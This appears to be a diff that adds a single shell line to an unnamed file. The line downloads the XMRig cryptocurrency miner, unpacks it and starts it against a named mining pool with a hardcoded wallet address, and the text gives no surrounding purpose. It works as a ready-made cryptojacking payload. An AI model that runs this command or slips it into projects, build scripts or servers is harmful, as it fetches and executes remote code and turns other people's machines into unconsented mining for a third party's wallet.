@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz && tar -zxvf xmrig-6.12.2-linux-x64.tar.gz && cd xmrig-6.12.2 && ./xmrig -o hk-upx.miningocean.org:4372 -u UPX1nLQQc5ZRpQQzPrrD6MW5XqbRUyWFNWBndiJZT4Qd4qnDgRFBcrshFS4AqUu1Sj84GgNP5hrepREvMunPfrKB8ApAGgmeCK.100000 -p pc1 -a cn/upx2
